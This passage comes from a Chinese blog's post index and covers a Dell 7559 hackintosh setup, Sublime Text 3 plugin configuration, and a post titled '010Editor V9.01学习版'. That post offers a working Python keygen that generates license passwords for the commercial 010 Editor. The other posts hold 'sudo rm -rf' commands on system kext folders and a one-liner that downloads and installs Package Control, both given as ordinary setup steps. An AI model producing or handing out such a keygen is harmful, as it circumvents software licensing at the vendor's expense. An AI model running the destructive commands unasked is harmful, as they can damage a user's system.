punctuation">></span></span>IOProviderClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>IOUSBHostDevice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idProduct<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>33292<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idVendor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>1452<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span></code></pre><p> 修改后如下</p><pre class=" language-xml"><code class="language-xml">     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOKitPersonalities<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>Broadcom2045FamilyUSBBluetoothHCIController_D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>CFBundleIdentifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>com.apple.iokit.BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOProviderClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>IOUSBHostDevice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idProduct<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>2602<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idVendor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>32903<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dict</span><span class="token punctuation">></span></span></code></pre></li><li><p>使用<code>Kext Utility</code>修复权限和重建缓存即可</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127155800.png" alt></p></li><li><p>效果如下,可开启,可关闭</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127224543.png" alt></p></li></ol><h2 id="0x06-耳机爆音修复"><a href="#0x06-耳机爆音修复" class="headerlink" title="0x06 耳机爆音修复"></a>0x06 耳机爆音修复</h2><ol><li><p>进入附件的<code>ALCPlugFix</code>目录</p></li><li><p>双击<code>install双击自动安装.command</code></p></li><li><p>用<code>Clover Configurator</code>打开<code>EFI/Clover/config.plist</code>,切换到<code>Boot</code>,在<code>Custom Flags</code>添加<code>-lilubetaall -alcbeta</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127221156.png" alt></p></li><li><p>切换到<code>Devices</code>标签,Audio下的<code>Inject</code>选择<code>13</code></p><blockquote><p>其实这一步操不操作没关系,因为我们已经在DSDT.aml中指定了</p></blockquote><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127221357.png" alt></p></li><li><p>重启</p></li></ol><h2 id="0x07-触摸板"><a href="#0x07-触摸板" class="headerlink" title="0x07 触摸板"></a>0x07 触摸板</h2><blockquote><p><code>ApplePS2SmartTouchPad.kext</code>的作者已经不更新多年了, 本人装了这个驱动, 虽然触摸板上可以看到手势,但是却一个也用不了… …所以下面是讲怎么安装<code>RehabMan</code>的触摸板驱动<code>VoodooPS2Controller.kext</code>的, 当然,如果你嫌麻烦,直接下载<code>VoodooPS2Controller.kext</code>放到<code>Other</code>下,然后重启一波就行!</p></blockquote><ol><li><p>安装指导链接 <a href="https://github.com/RehabMan/OS-X-Voodoo-PS2-Controller/wiki/How-to-Install" target="_blank" rel="noopener">https://github.com/RehabMan/OS-X-Voodoo-PS2-Controller/wiki/How-to-Install</a></p></li><li><p>软件下载链接 <a href="https://bitbucket.org/RehabMan/os-x-voodoo-ps2-controller/downloads/" target="_blank" rel="noopener">https://bitbucket.org/RehabMan/os-x-voodoo-ps2-controller/downloads/</a></p></li><li><p>从<code>/S/L/E</code>和<code>/L/E</code>中删除不兼容的kexts：</p><pre><code> sudo rm -rf /System/Library/Extensions/AppleACPIPS2Nub.kext sudo rm -rf /System/Library/Extensions/ApplePS2Controller.kext sudo rm -rf /System/Library/Extensions/ApplePS2SmartTouchPad.kext sudo rm -rf /Library/Extensions/AppleACPIPS2Nub.kext sudo rm -rf /Library/Extensions/ApplePS2Controller.kext sudo rm -rf /Library/Extensions/ApplePS2SmartTouchPad.kext</code></pre></li><li><p>安装VoodooPS2Controller.kext（10.11及更高版本）：</p><pre><code> cd directory-to-where-your-unzipped-download-is sudo cp -R Release/VoodooPS2Controller.kext /Library/Extensions</code></pre></li><li><p>重建内核缓存：</p><pre><code> sudo touch /System/Library/Extensions &amp;&amp; sudo kextcache -u /</code></pre></li><li><p>然后重启系统。</p></li><li><p>如果发现笔记本自带键盘<code>windows</code>键和<code>alt</code>键的功能交换了,则需要用到<code>Karabiner</code>交换<code>windows</code>和<code>alt</code>的功能</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211336.png" alt></p></li></ol><h2 id="0x08-背光保存"><a href="#0x08-背光保存" class="headerlink" title="0x08 背光保存"></a>0x08 背光保存</h2><ul><li>删除<code>/EFI/CLOVER/drivers64UEFI/EmuVariableUefi-64.efi</code>,然后重启两遍以上,即可保存背光亮度</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171552.png" alt></p><h2 id="0x09-其他的驱动"><a href="#0x09-其他的驱动" class="headerlink" title="0x09 其他的驱动"></a>0x09 其他的驱动</h2><ul><li>将<code>其他的驱动</code>里面的驱动拖到<code>/EFI/CLOVER/kexts/Other</code>里面</li></ul><table><thead><tr><th>驱动名</th><th>驱动内容</th></tr></thead><tbody><tr><td>Sinetek-rtsx.kext</td><td>SD卡驱动,没测试过,不知道有没有用</td></tr><tr><td>BrcmFirmwareData.kext和BrcmNonPatchRAM2.kext和BrcmPatchRAM2.kext</td><td>蓝牙驱动</td></tr><tr><td>FakePCIID_Broadcom_WiFi.kext</td><td>无线网卡驱动</td></tr><tr><td>FakePCIID_Intel_HD_Graphics.kext</td><td>内置显卡驱动</td></tr><tr><td>FakePCIID_Intel_HDMI_Audio.kext</td><td>HDMI_Audio驱动</td></tr><tr><td>FakePCIID.kext</td><td>没有这个,上面几个FakePCIID_xxx都无法正常工作</td></tr></tbody></table><ul><li>这个给出<code>蓝牙驱动</code>和<code>FakePCIID系列</code>的下载地址</li></ul><pre><code>https://bitbucket.org/RehabMan/os-x-brcmpatchram/downloads/https://bitbucket.org/RehabMan/os-x-fake-pci-id/downloads/</code></pre><ul><li>关于驱动的说明: <a href="http://bbs.pcbeta.com/viewthread-1779539-1-1.html" target="_blank" rel="noopener">http://bbs.pcbeta.com/viewthread-1779539-1-1.html</a></li></ul><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><ul><li>欢迎大家访问我的博客: <a href="https://fengwenhua.top" target="_blank" rel="noopener">https://fengwenhua.top</a> , 虽然博客上面没啥东西!</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 黑苹果 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑苹果 </tag>
            
            <tag> hackintosh </tag>
            
            <tag> dell-7559 </tag>
            
            <tag> 10.14.4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>010Editor V9.01学习版</title>
      <link href="/2019/04/29/010editor-v9-01-xue-xi-ban/"/>
      <url>/2019/04/29/010editor-v9-01-xue-xi-ban/</url>
      
        <content type="html"><![CDATA[<h1 id="V9-01"><a href="#V9-01" class="headerlink" title="V9.01"></a>V9.01</h1><ul><li>原文链接: <a href="https://www.52pojie.cn/thread-861486-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-861486-1-1.html</a></li><li>将下面代码粘贴到 python在线运行 <a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">https://tool.lu/coderunner/</a> 上面运行</li><li>注意, <code>username</code>随便填就行</li></ul><a id="more"></a><pre class=" language-python3"><code class="language-python3">TABLE = [       0x39cb44b8, 0x23754f67, 0x5f017211, 0x3ebb24da, 0x351707c6, 0x63f9774b, 0x17827288, 0x0fe74821,                0x5b5f670f, 0x48315ae8, 0x785b7769, 0x2b7a1547, 0x38d11292, 0x42a11b32, 0x35332244, 0x77437b60,                0x1eab3b10, 0x53810000, 0x1d0212ae, 0x6f0377a8, 0x43c03092, 0x2d3c0a8e, 0x62950cbf, 0x30f06ffa,                0x34f710e0, 0x28f417fb, 0x350d2f95, 0x5a361d5a, 0x15cc060b, 0x0afd13cc, 0x28603bcf, 0x3371066b,                0x30cd14e4, 0x175d3a67, 0x6dd66a13, 0x2d3409f9, 0x581e7b82, 0x76526b99, 0x5c8d5188, 0x2c857971,                0x15f51fc0, 0x68cc0d11, 0x49f55e5c, 0x275e4364, 0x2d1e0dbc, 0x4cee7ce3, 0x32555840, 0x112e2e08,                0x6978065a, 0x72921406, 0x314578e7, 0x175621b7, 0x40771dbf, 0x3fc238d6, 0x4a31128a, 0x2dad036e,                0x41a069d6, 0x25400192, 0x00dd4667, 0x6afc1f4f, 0x571040ce, 0x62fe66df, 0x41db4b3e, 0x3582231f,                0x55f6079a, 0x1ca70644, 0x1b1643d2, 0x3f7228c9, 0x5f141070, 0x3e1474ab, 0x444b256e, 0x537050d9,                0x0f42094b, 0x2fd820e6, 0x778b2e5e, 0x71176d02, 0x7fea7a69, 0x5bb54628, 0x19ba6c71, 0x39763a99,                0x178d54cd, 0x01246e88, 0x3313537e, 0x2b8e2d17, 0x2a3d10be, 0x59d10582, 0x37a163db, 0x30d6489a,                0x6a215c46, 0x0e1c7a76, 0x1fc760e7, 0x79b80c65, 0x27f459b4, 0x799a7326, 0x50ba1782, 0x2a116d5c,                0x63866e1b, 0x3f920e3c, 0x55023490, 0x55b56089, 0x2c391fd1, 0x2f8035c2, 0x64fd2b7a, 0x4ce8759a,                0x518504f0, 0x799501a8, 0x3f5b2cad, 0x38e60160, 0x637641d8, 0x33352a42, 0x51a22c19, 0x085c5851,                0x032917ab, 0x2b770ac7, 0x30ac77b3, 0x2bec1907, 0x035202d0, 0x0fa933d3, 0x61255df3, 0x22ad06bf,                0x58b86971, 0x5fca0de5, 0x700d6456, 0x56a973db, 0x5ab759fd, 0x330e0be2, 0x5b3c0ddd, 0x495d3c60,                0x53bd59a6, 0x4c5e6d91, 0x49d9318d, 0x103d5079, 0x61ce42e3, 0x7ed5121d, 0x14e160ed, 0x212d4ef2,                0x270133f0, 0x62435a96, 0x1fa75e8b, 0x6f092fbe, 0x4a000d49, 0x57ae1c70, 0x004e2477, 0x561e7e72,                0x468c0033, 0x5dcc2402, 0x78507ac6, 0x58af24c7, 0x0df62d34, 0x358a4708, 0x3cfb1e11, 0x2b71451c,                0x77a75295, 0x56890721, 0x0fef75f3, 0x120f24f1, 0x01990ae7, 0x339c4452, 0x27a15b8e, 0x0ba7276d,                0x60dc1b7b, 0x4f4b7f82, 0x67db7007, 0x4f4a57d9, 0x621252e8, 0x20532cfc, 0x6a390306, 0x18800423,                0x19f3778a, 0x462316f0, 0x56ae0937, 0x43c2675c, 0x65ca45fd, 0x0d604ff2, 0x0bfd22cb, 0x3afe643b,                0x3bf67fa6, 0x44623579, 0x184031f8, 0x32174f97, 0x4c6a092a, 0x5fb50261, 0x01650174, 0x33634af1,                0x712d18f4, 0x6e997169, 0x5dab7afe, 0x7c2b2ee8, 0x6edb75b4, 0x5f836fb6, 0x3c2a6dd6, 0x292d05c2,                0x052244db, 0x149a5f4f, 0x5d486540, 0x331d15ea, 0x4f456920, 0x483a699f, 0x3b450f05, 0x3b207c6c,                0x749d70fe, 0x417461f6, 0x62b031f1, 0x2750577b, 0x29131533, 0x588c3808, 0x1aef3456, 0x0f3c00ec,                0x7da74742, 0x4b797a6c, 0x5ebb3287, 0x786558b8, 0x00ed4ff2, 0x6269691e, 0x24a2255f, 0x62c11f7e,                0x2f8a7dcd, 0x643b17fe, 0x778318b8, 0x253b60fe, 0x34bb63a3, 0x5b03214f, 0x5f1571f4, 0x1a316e9f,                0x7acf2704, 0x28896838, 0x18614677, 0x1bf569eb, 0x0ba85ec9, 0x6aca6b46, 0x1e43422a, 0x514d5f0e,                0x413e018c, 0x307626e9, 0x01ed1dfa, 0x49f46f5a, 0x461b642b, 0x7d7007f2, 0x13652657, 0x6b160bc5,                0x65e04849, 0x1f526e1c, 0x5a0251b6, 0x2bd73f69, 0x2dbf7acd, 0x51e63e80, 0x5cf2670f, 0x21cd0a03,                0x5cff0261, 0x33ae061e, 0x3bb6345f, 0x5d814a75, 0x257b5df4, 0x0a5c2c5b, 0x16a45527, 0x16f23945    ]DW = 0x100000000def user_pro(username, a2, a3, a4):    v16 = 0    length = len(username)    i = 0    if length <= 0:        result = 0    else:        v13 = 0        v14 = 0        v7 = (15 * a4)%0x100        v15 = (17 * a3)%0x100        while i < length:            upperName_char = ord(username[i].upper())            v9 = (v16 + TABLE[upperName_char])%DW            if a2:                v10 = (TABLE[v7]\                        + TABLE[v15]\                        + TABLE[(upperName_char + 47)]\                        * (TABLE[(upperName_char + 13)] ^ v9))%DW                result = (TABLE[v14] + v10)%DW                v16 = (TABLE[v14] + v10)%DW            else:                v12 = (TABLE[v7]\                        + TABLE[v15]\                        + TABLE[(upperName_char + 23)]\                        * (TABLE[(upperName_char + 63)] ^ v9))%DW                result = (TABLE[v13] + v12)%DW                v16 = (TABLE[v13] + v12)%DW            v14+= 19            v14 %= 0x100            i+=1            v15 += 9            v15 %= 0x100            v7 += 13            v7 %= 0x100            v13 += 7            v13 %= 0x100    return resultfrom random import random as rnddef guess_v8v9():    while True:        i = (int)(rnd()*0x10000)        if ((((i^0x7892)+19760)^0x3421)%0x10000)%11==0 and ((((i^0x7892)+19760)^0x3421)%0x10000)//11 <= 1000:            return i, ((((i^0x7892)+19760)^0x3421)%0x10000)//11#username = raw_input('Name: ').strip()username = '52pojie' # 这里随便输入print('Username: %s'%username)p = [0]*8p[3] = 0x9cv8, v9 = guess_v8v9()def calc():    user = user_pro(username, True, 0, v9)    p[4] = user%0x100    p[5] = (user>>8)%0x100    p[6] = (user>>16)%0x100    p[7] = (user>>24)%0x100calc()p[2] = p[5]^(v8%0x100)p[1] = p[7]^(v8>>8)while True:    p[0] = (int)(rnd()*256)    v10 = (((p[6]^p[0])^0x18+61)%0x100)^0xa7    if v10>=10: breakfor i in range(8):    if p[i]<16:        p[i] = '0'+hex(p[i])[2:3].upper()    else:        p[i] = hex(p[i])[2:4].upper() print('Password: %s%s-%s%s-%s%s-%s%s'%(p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7]))</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190428161809.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> 010Editor </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 010Editor破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3 常用插件</title>
      <link href="/2019/04/29/sublime-text-3-chang-yong-cha-jian/"/>
      <url>/2019/04/29/sublime-text-3-chang-yong-cha-jian/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-安装package-control"><a href="#0x01-安装package-control" class="headerlink" title="0x01. 安装package control"></a>0x01. 安装package control</h3><blockquote><p>为了使用众多的插件来扩展 Sublime 的功能，你需要安装一个叫做 <strong>Package Control **的插件管理器,一旦你安装好了以后，你就可以使用 <code>Package Control</code>来安装，</strong>移除<strong>或者</strong>升级**所有的 ST3 插件了。</p></blockquote><ol><li><p>按<code>Ctrl+~</code>打开控制台</p></li><li><p>到 <a href="https://packagecontrol.io/installation#st3" target="_blank" rel="noopener">https://packagecontrol.io/installation#st3</a> 获取安装代码,这里如下</p><pre><code> import urllib.request,os,hashlib; h = &#39;6f4c264a24d933ce70df5dedcf1dcaee&#39; + &#39;ebe013ee18cced0ef93d5f746d80ef60&#39;; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &#39;http://packagecontrol.io/&#39; + pf.replace(&#39; &#39;, &#39;%20&#39;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&#39;Error validating download (got %s instead of %s), please try manual install&#39; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &#39;wb&#39; ).write(by)</code></pre> <a id="more"></a></li><li><p>输入完了按<code>Enter</code>就行</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530636719.jpg" alt></p></li><li><p>现在你可以通过快捷键 <code>Ctrl+Shift+P</code> 打开 <code>Package Control</code>来安装其他的插件了。输入 <code>install</code> 然后你就能看见屏幕上出现了 <code>Package Control: Install Package</code>，点击回车然后搜索你想要的插件。想装什么直接点击。注意看下面的<code>status bar</code>是显示进度的地方</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530636851.jpg" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530636877.jpg" alt></p></li><li><p>现在是2019.3.18,不知道啥时候开始,sublime text3 的插件源就被墙了…,所以你们很可能装不了<code>Package Control</code>,因此,想办法番羽土蔷下载<code>Package Control</code>,或者百度一下下载吧! 离线安装好<code>Package Control</code>后,接下来如何操作请参考博主的另一篇博文</p></li></ol><h3 id="0x02-安装Anaconda-python插件"><a href="#0x02-安装Anaconda-python插件" class="headerlink" title="0x02. 安装Anaconda python插件"></a>0x02. 安装<code>Anaconda</code> python插件</h3><blockquote><p><a href="https://sublime.wbond.net/packages/Anaconda" target="_blank" rel="noopener">Anaconda</a> 是一个终极 Python 插件。它为 ST3 增添了多项 IDE 类似的功能，其具体配置文件在 <a href="https://github.com/DamnWidget/anaconda" target="_blank" rel="noopener">https://github.com/DamnWidget/anaconda</a> 例如：</p></blockquote><ul><li><p><code>Autocompletion</code>:自动完成，该选项默认开启,按<code>TAB</code>或<code>Ctrl+Space</code>显示代码提示窗口</p></li><li><p><code>Goto Definitions</code>:能够在你的整个工程中查找并且显示任意一个变量，函数，或者类的定义。,键盘按下:<code>Ctrl+Alt+g</code></p></li><li><p><code>Find Usage</code> 使用此命令，用户可以找到正在使用符号（变量，函数，方法，类或模块）的所有位置。键盘按下:<code>Ctrl+Alt+f</code></p></li><li><p><code>Display Signatures</code>:能够显示一个函数或者类的说明性字符串(当然，是在定义了字符串的情况下)<br><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530639346.jpg" alt></p></li><li><p><code>Show Documentation</code>： 可以查找并向用户显示任何函数，方法，类，模块或包的文档字符串。用户只需将光标放在想要获取文档字符串的符号上（或在括号之后，例如在写入之后<code>sys.exit()</code>),然后键盘按下<code>Ctrl+Alt+d</code></p></li><li><p><code>Code linting</code>:使用支持 pep8 标准的 PyLint 或者 PyFlakes。因为我个人使用的是另外的 linting 工具，所以我会在 Anaconda 的配置文件 Anaconda.sublime-settings中将 linting 完全禁用。操作如下: <code>Sublime &gt; Preferences &gt; Package Settings &gt; Anaconda &gt; Settings – User： {&quot;anaconda_linting&quot;: false}</code></p></li><li><p>最后,配置一下Anaconda</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530639847.jpg" alt></p><pre><code>{&quot;python_interpreter&quot;:&quot;/usr/bin/python3&quot;,&quot;anaconda_linting&quot;: false,//保存文件后自动pep8格式化&quot;auto_formatting&quot;: true,// st3自动补全&quot;suppress_word_completions&quot;: true,&quot;suppress_explicit_completions&quot;: true,//&quot;complete_parameters&quot;: true}</code></pre><h3 id="0x03-SublimeREPL插件"><a href="#0x03-SublimeREPL插件" class="headerlink" title="0x03. SublimeREPL插件"></a>0x03. SublimeREPL插件</h3><blockquote><p><code>SublimeREPL</code>会新建一个交互式命令行界面,让你的py可以有输入</p></blockquote><h4 id="配置python3环境"><a href="#配置python3环境" class="headerlink" title="配置python3环境"></a>配置python3环境</h4><ol><li><p><code>Preferences</code>-&gt;<code>Browse Packages</code>,找到<code>SublimeREPL</code>的文件夹，再进入<code>config</code>文件夹，可以看到许多语言的配置文件，<code>Python</code>也在里面</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530640242.jpg" alt></p></li><li><p>在<code>config</code>文件夹下新建<code>python3</code>文件夹,在里面新建<code>Default.sublime-commands</code>和<code>Menu.sublime-menu</code>两个文件(模仿Python文件夹),因为我们Python3目前只要<strong>能打开shell运行，和运行这个脚本</strong>，两个功能，因此就只要包含<code>Python3</code>和 <code>Python3 – Run current file</code>两项就好了</p></li><li><p><code>Default.sublime-commands</code>配置如下：</p><pre><code> [     {         &quot;caption&quot;: &quot;SublimeREPL: Python3&quot;,         &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:         {             &quot;id&quot;: &quot;repl_python3&quot;,             &quot;file&quot;: &quot;config/Python3/Main.sublime-menu&quot;         }     },     {         &quot;caption&quot;: &quot;SublimeREPL: Python3 - RUN current file&quot;,         &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:         {             &quot;id&quot;: &quot;repl_python3_run&quot;,             &quot;file&quot;: &quot;config/Python3/Main.sublime-menu&quot;         }     } ]</code></pre></li><li><p><code>Menu.sublime-menu</code>配置如下：</p><pre><code> [      {         &quot;id&quot;: &quot;tools&quot;,         &quot;children&quot;:         [{             &quot;caption&quot;: &quot;SublimeREPL&quot;,             &quot;mnemonic&quot;: &quot;R&quot;,             &quot;id&quot;: &quot;SublimeREPL&quot;,             &quot;children&quot;:             [                 {&quot;caption&quot;: &quot;Python3&quot;,                 &quot;id&quot;: &quot;Python3&quot;,                  &quot;children&quot;:[                     {&quot;command&quot;: &quot;repl_open&quot;,                      &quot;caption&quot;: &quot;Python3&quot;,                      &quot;id&quot;: &quot;repl_python3&quot;,                      &quot;mnemonic&quot;: &quot;P&quot;,                      &quot;args&quot;: {                         &quot;type&quot;: &quot;subprocess&quot;,                         &quot;encoding&quot;: &quot;utf8&quot;,                         &quot;cmd&quot;: [&quot;python3&quot;, &quot;-i&quot;, &quot;-u&quot;],                         &quot;cwd&quot;: &quot;$file_path&quot;,                         &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;,                         &quot;external_id&quot;: &quot;python3&quot;,                         &quot;extend_env&quot;: {&quot;PYTHONIOENCODING&quot;: &quot;utf-8&quot;}                         }                     },                     {&quot;command&quot;: &quot;repl_open&quot;,                      &quot;caption&quot;: &quot;Python3 - RUN current file&quot;,                      &quot;id&quot;: &quot;repl_python3_run&quot;,                      &quot;mnemonic&quot;: &quot;R&quot;,                      &quot;args&quot;: {                         &quot;type&quot;: &quot;subprocess&quot;,                         &quot;encoding&quot;: &quot;utf8&quot;,                         &quot;cmd&quot;: [&quot;python3&quot;, &quot;-u&quot;, &quot;$file_basename&quot;],                         &quot;cwd&quot;: &quot;$file_path&quot;,                         &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;,                         &quot;external_id&quot;: &quot;python3&quot;,                         &quot;extend_env&quot;: {&quot;PYTHONIOENCODING&quot;: &quot;utf-8&quot;}                         }                     }                 ]}             ]         }]     } ]</code></pre></li><li><p>保存文件后,就可以<code>Tools</code>-&gt;<code>SublimeREPL</code>-&gt;<code>Python3</code>运行命令了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530640916.jpg" alt></p></li><li><p>为了好看,采取和<code>Ctr+B</code>同样的上下布局</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530641055.jpg" alt></p></li></ol><h4 id="设置key-binding"><a href="#设置key-binding" class="headerlink" title="设置key binding"></a>设置key binding</h4><p>每次这样到菜单栏里去找，太慢，能不能像<code>ctrl+B</code>一样直接运行呢？可以的，只要设置快捷键就好了，在<code>Preference</code>-&gt;<code>key Bindings-User</code>里</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530641287.jpg" alt></p><p>写入如下配置,即可<code>F4</code>运行<code>python2.7 repl</code>, <code>F5</code> 运行<code>python 3 repl</code>,<strong>注意<code>id</code>还是要和<code>Menu.sublime-menu</code>文件里的<code>id</code>要一致，</strong></p><pre><code>[    {        &quot;keys&quot;:[&quot;f4&quot;],        &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;,        &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:        {            &quot;id&quot;: &quot;repl_python_run&quot;,            &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;        }    },    {        &quot;keys&quot;:[&quot;f5&quot;],        &quot;caption&quot;: &quot;SublimeREPL: Python3 - RUN current file&quot;,        &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:        {            &quot;id&quot;: &quot;repl_python3_run&quot;,            &quot;file&quot;: &quot;config/Python3/Main.sublime-menu&quot;        }    }]</code></pre><h4 id="can’t-open-file-‘-file-basename’-Errno-2-No-such-file-or-directory"><a href="#can’t-open-file-‘-file-basename’-Errno-2-No-such-file-or-directory" class="headerlink" title="can’t open file ‘$file_basename’: [Errno 2] No such file or directory"></a>can’t open file ‘$file_basename’: [Errno 2] No such file or directory</h4><p>这个只要再次用鼠标点击一下<code>test.py</code>就好了，就可以获取运行的文件了</p><h3 id="0x04-SublimeTmpl"><a href="#0x04-SublimeTmpl" class="headerlink" title="0x04. SublimeTmpl"></a>0x04. SublimeTmpl</h3><blockquote><p>新建文件模板</p></blockquote><ol><li><p>在<code>settings-user</code>写入以下信息</p><pre><code> {     &quot;disable_keymap_actions&quot;: false, // &quot;all&quot;; &quot;html,css&quot;     &quot;date_format&quot; : &quot;%Y-%m-%d %H:%M:%S&quot;,     &quot;attr&quot;: {         &quot;author&quot;: &quot;江南小虫虫&quot;,         &quot;email&quot;: &quot;fwh13612265462@gmail.com&quot;,         &quot;link&quot;: &quot;http://www.fengwenhua.top&quot;     } }</code></pre></li><li><p><code>Ctlr+Alt+Shift+P</code>:默认创建python文件,这里进行修改.在<code>key bindings-user</code>中添加了以下信息，意思<code>ctrl+alt+n</code>就可以创建一个新的Python模板</p><pre><code>      {          &quot;caption&quot;: &quot;Tmpl: Create python&quot;, &quot;command&quot;: &quot;sublime_tmpl&quot;,          &quot;keys&quot;: [&quot;ctrl+alt+n&quot;], &quot;args&quot;: {&quot;type&quot;: &quot;python&quot;}      },</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1532966184.jpg" alt></p></li></ol><h3 id="0x05-SideBarEnhancements"><a href="#0x05-SideBarEnhancements" class="headerlink" title="0x05. SideBarEnhancements"></a>0x05. SideBarEnhancements</h3><ul><li>安装完后,可以在<code>View</code>-&gt;<code>Side Bar</code>-&gt;<code>Show Side Bar</code>打开</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209171421.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> sublime text 3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sublime text 3 常用插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3 运行C-C++</title>
